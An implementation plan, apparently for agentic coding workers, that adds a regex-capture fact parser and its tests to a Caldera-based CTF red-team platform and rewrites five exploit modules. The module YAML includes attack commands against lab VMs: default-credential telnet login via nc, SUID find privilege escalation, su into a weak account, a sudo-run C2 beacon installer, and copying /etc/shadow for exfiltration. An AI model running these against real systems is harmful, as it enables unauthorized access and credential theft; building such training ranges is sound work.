# Module Caldera Facts Adoption — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Adopt native Caldera facts in five curated modules and add a regex-capture parser so recon extracts clean values that exploit commands inject via `#{...}`.

**Architecture:** Add one new Caldera plugin parser (`ctf_extract`) that stores a regex capture group as a fact value; rewrite five modules to declare custom `parser`/`requirements` and reference `#{...}` facts in commands; document the fact features in `MODULE_GUIDE.md`.

**Tech Stack:** Python 3.12, PyYAML, Jinja2 (ability template), pytest; Caldera plugin parser API (`app.objects.secondclass.c_fact.Fact`, `app.utility.base_parser.BaseParser`).

**Spec:** `docs/superpowers/specs/2026-08-17-module-caldera-facts-adoption-design.md`

## Global Constraints

- Parser module path: `plugins.ctf-exploit.app.parsers.ctf_extract`.
- Requirement module path: `plugins.ctf-exploit.app.requirements.fact_present`.
- Recon fact trait: `ctf.vuln.<module_id>`; goal fact trait: `ctf.goal.<goal_id>`.
- Seeded facts: `ctf.hostname`, `ctf.ip`, `ctf.os`, `host.id`.
- Do NOT modify `builder/caldera.py`, `templates/caldera_ability.yml.j2`, or adversary/objective templates — only add the new parser file.
- Authoritative test runner: `docker compose --profile test run --rm tests`; local `pytest` for fast red/green cycles.

---

### Task 1: `ctf_extract` regex-capture parser

**Files:**
- Create: `builder/caldera_plugin_app/parsers/ctf_extract.py`
- Test: `tests/test_ctf_extract_parser.py`

**Interfaces:**
- Produces: `class Parser(BaseParser)` with `parse(self, blob) -> list[Relationship]`; reads `custom_parser_vals.pattern`, `custom_parser_vals.group` (default `1`), `custom_parser_vals.marker`; emits `Fact(source, captured_value)`.

- [ ] **Step 1: Write the failing test**

```python
"""Unit tests for the ctf_extract Caldera parser (regex-capture facts)."""

import importlib
import sys
import types

import pytest


class _Fact:
    def __init__(self, trait, value=""):
        self.trait = trait
        self.value = value


class _Relationship:
    def __init__(self, source=None, edge=None, target=None):
        self.source = source
        self.edge = edge
        self.target = target


class _BaseParser:
    def line(self, blob):
        return blob.splitlines()


@pytest.fixture
def parser_module(monkeypatch):
    fact_mod = types.ModuleType("app.objects.secondclass.c_fact")
    fact_mod.Fact = _Fact
    rel_mod = types.ModuleType("app.objects.secondclass.c_relationship")
    rel_mod.Relationship = _Relationship
    bp_mod = types.ModuleType("app.utility.base_parser")
    bp_mod.BaseParser = _BaseParser
    for name in ("app", "app.objects", "app.objects.secondclass", "app.utility"):
        pkg = types.ModuleType(name)
        pkg.__path__ = []
        monkeypatch.setitem(sys.modules, name, pkg)
    monkeypatch.setitem(sys.modules, "app.objects.secondclass.c_fact", fact_mod)
    monkeypatch.setitem(sys.modules, "app.objects.secondclass.c_relationship", rel_mod)
    monkeypatch.setitem(sys.modules, "app.utility.base_parser", bp_mod)
    module = importlib.import_module("builder.caldera_plugin_app.parsers.ctf_extract")
    return importlib.reload(module)


def _parser(module, custom_parser_vals, source_facts=()):
    p = module.Parser()
    p.mappers = [types.SimpleNamespace(
        source="ctf.vuln.demo", target=None, edge=None,
        custom_parser_vals=custom_parser_vals,
    )]
    p.source_facts = [types.SimpleNamespace(trait=f.trait, value=f.value) for f in source_facts]
    p.used_facts = []
    return p


class TestCtfExtractParser:
    def test_captures_group_into_fact_value(self, parser_module):
        p = _parser(parser_module, {"pattern": "port=(\\d+)", "marker": "VULNERABLE"})
        rels = p.parse("VULNERABLE port=23\nother line\n")
        assert len(rels) == 1
        assert rels[0].source.trait == "ctf.vuln.demo"
        assert rels[0].source.value == "23"

    def test_respects_marker(self, parser_module):
        p = _parser(parser_module, {"pattern": "port=(\\d+)", "marker": "VULNERABLE"})
        assert p.parse("SECURE port=23\n") == []

    def test_no_fact_when_pattern_missing(self, parser_module):
        p = _parser(parser_module, {"pattern": "port=(\\d+)"})
        assert p.parse("nothing here\n") == []

    def test_prefers_seeded_source_fact(self, parser_module):
        p = _parser(parser_module, {"pattern": "port=(\\d+)"},
                    source_facts=[types.SimpleNamespace(trait="ctf.vuln.demo", value="8443")])
        rels = p.parse("VULNERABLE port=23\n")
        assert rels[0].source.value == "8443"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_ctf_extract_parser.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'builder.caldera_plugin_app.parsers.ctf_extract'`

- [ ] **Step 3: Write the parser**

```python
import re

from app.objects.secondclass.c_fact import Fact
from app.objects.secondclass.c_relationship import Relationship
from app.utility.base_parser import BaseParser


class Parser(BaseParser):
    """Emit a fact from a regex capture group in command output.

    Each ParserConfig mapping may set ``source`` (required), ``edge`` and
    ``target`` (optional relationship), and ``custom_parser_vals`` with:

      - ``pattern`` (required) — regex whose capture group becomes the fact value;
      - ``group`` (optional, default 1) — capture-group index to extract;
      - ``marker`` (optional) — substring the line must contain before matching.

    Fact values are the captured token, so recon can extract a clean value
    (port, path, username) that a later ability injects via ``#{<source>}``.
    """

    def parse(self, blob):
        relationships = []
        for match in self.line(blob):
            for mp in self.mappers:
                pattern = ""
                group = 1
                marker = ""
                if getattr(mp, "custom_parser_vals", None):
                    pattern = mp.custom_parser_vals.get("pattern") or ""
                    group = mp.custom_parser_vals.get("group", 1)
                    marker = mp.custom_parser_vals.get("marker") or ""
                if not pattern or (marker and marker not in match):
                    continue
                captured = self._capture(pattern, group, match)
                if captured is None:
                    continue
                value = self._merge_value(mp.source, captured)
                source = Fact(mp.source, value)
                if mp.target:
                    relationships.append(
                        Relationship(
                            source=source,
                            edge=mp.edge,
                            target=Fact(mp.target, value),
                        )
                    )
                else:
                    relationships.append(Relationship(source=source))
        return relationships

    def _capture(self, pattern, group, match):
        found = re.search(pattern, match)
        if not found:
            return None
        try:
            return found.group(group)
        except IndexError:
            return None

    def _merge_value(self, trait, value):
        """Prefer an existing seeded source fact; otherwise use the capture.

        Mirrors ctf_basic's idempotency: once a fact with this trait exists in
        the operation source, later recon runs reuse its value rather than
        overwriting it.
        """
        for sf in self.source_facts:
            if trait == sf.trait:
                return sf.value
        return value
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python3 -m pytest tests/test_ctf_extract_parser.py -v`
Expected: 4 passed

- [ ] **Step 5: Commit**

```bash
git add builder/caldera_plugin_app/parsers/ctf_extract.py tests/test_ctf_extract_parser.py
git commit -m "feat: add ctf_extract regex-capture Caldera parser"
```

---

### Task 2: Builder recognises and stages `ctf_extract`

**Files:**
- Test: `tests/test_caldera_builder.py`

**Interfaces:**
- Consumes: `_build_abilities` (existing), `_write_plugin`/`generate_caldera_event_export` (existing), `_mod`/`_caldera` helpers (existing in file).

- [ ] **Step 1: Write the failing tests** (append to `tests/test_caldera_builder.py`, inside the native-fact-gating test class)

```python
    def test_explicit_ctf_extract_parser_produces_mappings(self):
        """A module declaring the ctf_extract parser flows through verbatim."""
        m = _mod("v1", caldera=_caldera("initial-access", recon_cmd="echo VULNERABLE port=23"))
        m.caldera["recon"]["parser"] = [{
            "module": "plugins.ctf-exploit.app.parsers.ctf_extract",
            "mappings": [{
                "source": "ctf.vuln.v1",
                "custom_parser_vals": {"marker": "VULNERABLE", "pattern": "port=(\\d+)"},
            }],
        }]
        recon = [a for a in _build_abilities([m]) if a["phase"] == "recon"][0]
        assert recon["parsers"] == [{
            "module": "plugins.ctf-exploit.app.parsers.ctf_extract",
            "mappings": [{
                "source": "ctf.vuln.v1",
                "custom_parser_vals": {"marker": "VULNERABLE", "pattern": "port=(\\d+)"},
            }],
        }]
```

And in `TestPluginAppStaging` (near the existing `test_plugin_app_staged`):

```python
    def test_ctf_extract_parser_staged(self, export_tmp):
        """The ctf_extract parser is staged under plugin app/parsers/."""
        import builder.caldera as bc
        vulns, _ = self._real_modules()
        out, _ = bc.generate_caldera_event_export({"vm-a": vulns[:2]}, "integration-ctf-extract")
        plugin = out / "plugins" / PLUGIN_NAME
        assert (plugin / "app" / "parsers" / "ctf_extract.py").exists()
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `python3 -m pytest tests/test_caldera_builder.py -k "ctf_extract" -v`
Expected: FAIL — the first test fails (parser mappings absent; no module declares it), the second fails only if `ctf_extract.py` is not yet staged (it should fail before Task 1 is merged, but after Task 1 it will pass — this is an additive regression test).

- [ ] **Step 3: Verify green after Task 1**

Run: `python3 -m pytest tests/test_caldera_builder.py -v`
Expected: all pass (no production change needed for Task 2 — the builder already passes parser/requirements through and stages the whole plugin app dir).

- [ ] **Step 4: Commit**

```bash
git add tests/test_caldera_builder.py
git commit -m "test: cover ctf_extract parser flow and staging"
```

---

### Task 3: Rewrite `open_telnet` (Patterns B + C)

**Files:**
- Test: `tests/test_module_facts.py` (create)
- Modify: `modules/vulns/open_telnet/open_telnet.yaml`

**Interfaces:**
- Consumes: `load_all_modules` (existing), `_build_abilities`, `fact_trait` from `builder.caldera`.

- [ ] **Step 1: Write the failing test**

```python
"""Tests that curated modules use the native Caldera fact system."""

from builder.caldera import _build_abilities, fact_trait
from builder.module_loader import load_all_modules

CTF_EXTRACT = "plugins.ctf-exploit.app.parsers.ctf_extract"
FACT_PRESENT = "plugins.ctf-exploit.app.requirements.fact_present"


def _module(module_id):
    return next(m for m in load_all_modules() if m.id == module_id)


def _ability(module_id, phase):
    return next(a for a in _build_abilities([_module(module_id)]) if a["phase"] == phase)


def _recon_parser(module_id):
    return _ability(module_id, "recon")["parsers"][0]


class TestOpenTelnetFacts:
    def test_recon_extracts_port_into_fact(self):
        parser = _recon_parser("open_telnet")
        assert parser["module"] == CTF_EXTRACT
        assert parser["mappings"][0]["source"] == fact_trait("open_telnet")
        assert parser["mappings"][0]["custom_parser_vals"]["pattern"] == "port=(\\d+)"

    def test_exploit_injects_port_and_seeded_ip(self):
        command = _ability("open_telnet", "exploit")["command"]
        assert fact_trait("open_telnet") in command
        assert "#{ctf.ip}" in command
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_module_facts.py -k OpenTelnet -v`
Expected: FAIL — `assert 'plugins.ctf-exploit.app.parsers.ctf_basic' == 'plugins.ctf-exploit.app.parsers.ctf_extract'` (current recon uses the default parser).

- [ ] **Step 3: Rewrite the caldera section**

Replace the `caldera:` block in `modules/vulns/open_telnet/open_telnet.yaml` with:

```yaml
caldera:
  tactic: initial-access
  technique:
    attack_id: T1133
    name: "External Remote Services"
  recon:
    description: "Discover the listening telnet port"
    parser:
      - module: plugins.ctf-exploit.app.parsers.ctf_extract
        mappings:
          - source: ctf.vuln.open_telnet
            custom_parser_vals:
              marker: VULNERABLE
              pattern: "port=(\\d+)"
    command: |
      PORT=$(ss -tlnp 2>/dev/null | grep -E ':23\b' | grep -oP ':(\d+)\b' | head -1 | tr -d ':')
      [ -n "$PORT" ] && echo "VULNERABLE port=$PORT" || echo "SECURE: port 23 is not listening"
  exploit:
    description: "Connect to the discovered telnet port and attempt login with default credentials"
    command: |
      PORT="#{ctf.vuln.open_telnet}"
      (printf 'root\nchangeme123\n' | timeout 5 nc -q 3 #{ctf.ip} "${PORT}") 2>/dev/null | head -10 \
        || echo "Telnet open on #{ctf.ip}:${PORT} (connect manually for interactive login)"
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python3 -m pytest tests/test_module_facts.py -k OpenTelnet -v`
Expected: 2 passed

- [ ] **Step 5: Commit**

```bash
git add tests/test_module_facts.py modules/vulns/open_telnet/open_telnet.yaml
git commit -m "feat: open_telnet extracts port fact and uses seeded IP"
```

---

### Task 4: Rewrite `suid_find` (Pattern C)

**Files:**
- Test: `tests/test_module_facts.py`
- Modify: `modules/vulns/suid_find/suid_find.yaml`

- [ ] **Step 1: Write the failing test** (append class to `tests/test_module_facts.py`)

```python
class TestSuidFindFacts:
    def test_recon_extracts_binary_path(self):
        parser = _recon_parser("suid_find")
        assert parser["module"] == CTF_EXTRACT
        assert parser["mappings"][0]["custom_parser_vals"]["pattern"] == "path=(\\S+)"

    def test_exploit_injects_discovered_path(self):
        command = _ability("suid_find", "exploit")["command"]
        assert fact_trait("suid_find") in command
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_module_facts.py -k SuidFind -v`
Expected: FAIL — recon parser is the default `ctf_basic`.

- [ ] **Step 3: Rewrite the caldera section**

Replace the `caldera:` block in `modules/vulns/suid_find/suid_find.yaml` with:

```yaml
caldera:
  tactic: privilege-escalation
  technique:
    attack_id: T1548.001
    name: "Abuse Elevation Control Mechanism: Setuid and Setgid"
  recon:
    description: "Discover the SUID find binary path"
    parser:
      - module: plugins.ctf-exploit.app.parsers.ctf_extract
        mappings:
          - source: ctf.vuln.suid_find
            custom_parser_vals:
              marker: VULNERABLE
              pattern: "path=(\\S+)"
    command: |
      BIN=$(find / -perm -4000 -name find -type f 2>/dev/null | head -1)
      [ -n "$BIN" ] && echo "VULNERABLE path=$BIN" || echo "SECURE: find has normal permissions"
  exploit:
    description: "Escalate privileges via the discovered SUID find -exec"
    command: |
      BIN="#{ctf.vuln.suid_find}"
      "$BIN" /tmp -maxdepth 0 -exec whoami \;
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python3 -m pytest tests/test_module_facts.py -k SuidFind -v`
Expected: 2 passed

- [ ] **Step 5: Commit**

```bash
git add tests/test_module_facts.py modules/vulns/suid_find/suid_find.yaml
git commit -m "feat: suid_find extracts binary path fact"
```

---

### Task 5: Rewrite `weak_ssh_credentials` (Pattern C)

**Files:**
- Test: `tests/test_module_facts.py`
- Modify: `modules/vulns/weak_ssh_credentials/weak_ssh_credentials.yaml`

- [ ] **Step 1: Write the failing test** (append class to `tests/test_module_facts.py`)

```python
class TestWeakSshFacts:
    def test_recon_extracts_username(self):
        parser = _recon_parser("weak_ssh_credentials")
        assert parser["module"] == CTF_EXTRACT
        assert parser["mappings"][0]["custom_parser_vals"]["pattern"] == "user=(\\S+)"

    def test_exploit_injects_discovered_user(self):
        command = _ability("weak_ssh_credentials", "exploit")["command"]
        assert fact_trait("weak_ssh_credentials") in command
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_module_facts.py -k WeakSsh -v`
Expected: FAIL — recon parser is the default `ctf_basic`.

- [ ] **Step 3: Rewrite the caldera section**

Replace the `caldera:` block in `modules/vulns/weak_ssh_credentials/weak_ssh_credentials.yaml` with:

```yaml
caldera:
  tactic: initial-access
  technique:
    attack_id: T1110.001
    name: "Brute Force: Password Guessing"
  recon:
    description: "Discover the weak-credential account"
    parser:
      - module: plugins.ctf-exploit.app.parsers.ctf_extract
        mappings:
          - source: ctf.vuln.weak_ssh_credentials
            custom_parser_vals:
              marker: VULNERABLE
              pattern: "user=(\\S+)"
    command: |
      id svc-monitor >/dev/null 2>&1 && echo "VULNERABLE user=svc-monitor" || echo "SECURE: account not found"
  exploit:
    description: "Authenticate using the discovered weak account to establish a foothold"
    command: |
      USER="#{ctf.vuln.weak_ssh_credentials}"
      su -c "id && grep '$USER' /etc/passwd" "$USER"
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python3 -m pytest tests/test_module_facts.py -k WeakSsh -v`
Expected: 2 passed

- [ ] **Step 5: Commit**

```bash
git add tests/test_module_facts.py modules/vulns/weak_ssh_credentials/weak_ssh_credentials.yaml
git commit -m "feat: weak_ssh_credentials extracts username fact"
```

---

### Task 6: Rewrite `install_c2` (Pattern A — cross-module goal gating)

**Files:**
- Test: `tests/test_module_facts.py`
- Modify: `modules/goals/install_c2/install_c2.yaml`

- [ ] **Step 1: Write the failing test** (append class to `tests/test_module_facts.py`)

```python
class TestInstallC2Gating:
    def test_exploit_gates_on_nopasswd_sudo_fact(self):
        exploit = _ability("install_c2", "exploit")
        assert exploit["requirements"] == [{
            "module": FACT_PRESENT,
            "mappings": [{"source": fact_trait("nopasswd_sudo")}],
        }]
        assert fact_trait("nopasswd_sudo") in exploit["command"]
        assert "SKIPPED" in exploit["command"]
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_module_facts.py -k InstallC2 -v`
Expected: FAIL — `assert exploit["requirements"] == [...]` (currently `[]`).

- [ ] **Step 3: Rewrite the caldera exploit section**

Replace the `caldera:` block in `modules/goals/install_c2/install_c2.yaml` with:

```yaml
caldera:
  tactic: command-and-control
  technique:
    attack_id: T1219
    name: "Remote Access Software"
  exploit:
    description: "Install a persistent beacon via systemd service"
    requirements:
      - source: ctf.vuln.nopasswd_sudo
    command: |
      [ -n "#{ctf.vuln.nopasswd_sudo}" ] || { echo "SKIPPED: passwordless sudo not confirmed"; exit 0; }
      sudo bash ./install_c2.sh
    payloads:
      - install_c2.sh
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python3 -m pytest tests/test_module_facts.py -k InstallC2 -v`
Expected: 1 passed

- [ ] **Step 5: Commit**

```bash
git add tests/test_module_facts.py modules/goals/install_c2/install_c2.yaml
git commit -m "feat: install_c2 goal gates on nopasswd_sudo fact"
```

---

### Task 7: Rewrite `exfil_shadow` (Pattern A — cross-module goal gating)

**Files:**
- Test: `tests/test_module_facts.py`
- Modify: `modules/goals/exfil_shadow/exfil_shadow.yaml`

- [ ] **Step 1: Write the failing test** (append class to `tests/test_module_facts.py`)

```python
class TestExfilShadowGating:
    def test_exploit_gates_on_world_writable_shadow_fact(self):
        exploit = _ability("exfil_shadow", "exploit")
        assert exploit["requirements"] == [{
            "module": FACT_PRESENT,
            "mappings": [{"source": fact_trait("world_writable_shadow")}],
        }]
        assert fact_trait("world_writable_shadow") in exploit["command"]
        assert "SKIPPED" in exploit["command"]
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_module_facts.py -k ExfilShadow -v`
Expected: FAIL — `assert exploit["requirements"] == [...]` (currently `[]`).

- [ ] **Step 3: Rewrite the caldera exploit section**

Replace the `caldera:` block in `modules/goals/exfil_shadow/exfil_shadow.yaml` with:

```yaml
caldera:
  tactic: collection
  technique:
    attack_id: T1005
    name: "Data from Local System"
  exploit:
    description: "Read /etc/shadow and stage it for exfiltration"
    requirements:
      - source: ctf.vuln.world_writable_shadow
    command: |
      [ -n "#{ctf.vuln.world_writable_shadow}" ] || { echo "SKIPPED: shadow file is not world-readable"; exit 0; }
      cat /etc/shadow > /tmp/.exfil_shadow && echo "GOAL_ACHIEVED: shadow file staged at /tmp/.exfil_shadow"
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python3 -m pytest tests/test_module_facts.py -k ExfilShadow -v`
Expected: 1 passed

- [ ] **Step 5: Commit**

```bash
git add tests/test_module_facts.py modules/goals/exfil_shadow/exfil_shadow.yaml
git commit -m "feat: exfil_shadow goal gates on world_writable_shadow fact"
```

---

### Task 8: Document facts in `MODULE_GUIDE.md`

**Files:**
- Modify: `MODULE_GUIDE.md`

- [ ] **Step 1: Add optional-field rows** (after the existing `suggested_fix` row in the Optional Fields table)

```markdown
| `stage` | string | `null` | For vulnerability/payload: `preapplied` (blue team sees + fixes) or `caldera` (hidden, red team exploits). |
| `supported_bases` | list[string] | `[]` | Base type IDs this module is compatible with (e.g. `[ubuntu_24_server]`). |
| `min_ram_mb` | integer | `0` | Minimum RAM the module requires (plan sizing). |
| `min_vcpu` | integer | `0` | Minimum vCPUs the module requires (plan sizing). |
```

- [ ] **Step 2: Add "Caldera Metadata" section** (before "## Verification Types")

```markdown
## Caldera Metadata

A vulnerability, payload, or goal module may declare a `caldera` block so it participates in red team operations. The block maps an ATT&CK tactic/technique to `recon` and `exploit` command phases.

```yaml
caldera:
  tactic: privilege-escalation          # ATT&CK tactic (see kill-chain mapping)
  phase_override: 3                      # optional: override tactic→phase ordering
  technique:
    attack_id: T1548.001
    name: "Abuse Elevation Control Mechanism: Setuid and Setgid"
  recon:
    description: "Check if find has the SUID bit"
    command: |
      test -u /usr/bin/find && echo "VULNERABLE: SUID find detected" || echo "SECURE"
  exploit:
    description: "Escalate via SUID find -exec"
    command: |
      /usr/bin/find /tmp -maxdepth 0 -exec whoami \;
```

- `tactic` maps to a kill-chain phase: `initial-access(0)`, `execution(1)`, `persistence(2)`, `privilege-escalation(3)`, `credential-access(4)`, `collection(5)`, `impact(6)`, `command-and-control(7)`, goal `(8)`. Tactics not in this list must declare `phase_override`.
- `recon` and `exploit` each support `description`, `command`, `cleanup`, `payloads` (`.sh`/files in the module dir), and `uploads`.
- Application modules do not declare `caldera`.
```

- [ ] **Step 3: Add "Caldera Facts & Gating" section** (after the "Caldera Metadata" section)

```markdown
## Caldera Facts & Gating

Recon and exploit abilities communicate through Caldera facts. A fact has a trait and a value; commands reference a fact's value with `#{<trait>}`.

**Seeded facts** are injected into every operation source from VM metadata and need no recon step:

- `ctf.hostname`, `ctf.ip`, `ctf.os`, `host.id`

**Recon facts** — a recon command that echoes the `VULNERABLE` marker automatically emits a `ctf.vuln.<module_id>` fact (via the `ctf_basic` parser), and the exploit ability automatically gains a `fact_present` requirement plus a `[ -n "#{ctf.vuln.<id>}" ] || ...` guard, so it only runs after recon confirms the vulnerability.

**Goal facts** — a goal exploit that echoes `GOAL_ACHIEVED` emits a `ctf.goal.<goal_id>` fact that drives objective completion.

**Valued facts** — to capture a clean token (port, path, username) and inject it into a later command, declare the `ctf_extract` parser in recon:

```yaml
recon:
  parser:
    - module: plugins.ctf-exploit.app.parsers.ctf_extract
      mappings:
        - source: ctf.vuln.open_telnet
          custom_parser_vals:
            marker: VULNERABLE          # optional line filter
            pattern: "port=(\\d+)"      # regex; capture group becomes the value
            # group: 1                  # optional capture-group index (default 1)
  command: |
    PORT=$(ss -tlnp | grep -oP ':(\d+)\b' | head -1 | tr -d ':')
    [ -n "$PORT" ] && echo "VULNERABLE port=$PORT" || echo "SECURE"
```

Then the exploit injects the value:

```yaml
exploit:
  command: |
    PORT="#{ctf.vuln.open_telnet}"
    nc #{ctf.ip} "${PORT}"
```

**Cross-module gating** — an exploit can gate on another module's fact by declaring a `requirements` entry and referencing the fact in the command:

```yaml
exploit:
  requirements:
    - source: ctf.vuln.nopasswd_sudo
  command: |
    [ -n "#{ctf.vuln.nopasswd_sudo}" ] || { echo "SKIPPED: sudo not confirmed"; exit 0; }
    sudo id
```
```

- [ ] **Step 4: Add goal-module fields + type key** (append a "Goal Modules" section before "## Module Selection", and add `goal` to the type list)

```markdown
## Goal Modules

A `type: goal` module is a terminal red team objective. It adds three fields:

| Field | Type | Description |
|-------|------|-------------|
| `red_points` | integer | Awarded to the red team each time the goal is achieved. |
| `defend_points` | integer | Awarded to the blue team each time the goal is reverted. |
| `revert_verification` | object | Detects that the blue team reverted the goal. |

Goals declare a `caldera.exploit` whose command echoes `GOAL_ACHIEVED`; its `verification`/`revert_verification` drive the VMGoal state machine. See `modules/goals/install_c2/install_c2.yaml`.
```

And change the line:

```
Valid module type keys: `vulnerability`, `hardening`, `payload`, `application_external`, `application_internal`.
```

to:

```
Valid module type keys: `vulnerability`, `hardening`, `payload`, `application_external`, `application_internal`, `goal`.
```

- [ ] **Step 5: Commit**

```bash
git add MODULE_GUIDE.md
git commit -m "docs: document caldera metadata and facts in MODULE_GUIDE"
```

---

### Task 9: Full-suite verification

- [ ] **Step 1: Run local fast suites**

Run: `python3 -m pytest tests/test_ctf_extract_parser.py tests/test_caldera_builder.py tests/test_module_facts.py tests/test_module_loader.py -v`
Expected: all pass.

- [ ] **Step 2: Run authoritative Docker suite**

Run: `docker compose --profile test build tests && docker compose --profile test run --rm tests`
Expected: full suite passes. (Known pre-existing, unrelated failure: `tests/test_gamenet.py::test_planner_save_accepts_equivalent_timezone_revision`.)

- [ ] **Step 3: Commit any remaining changes**

```bash
git status --short
```
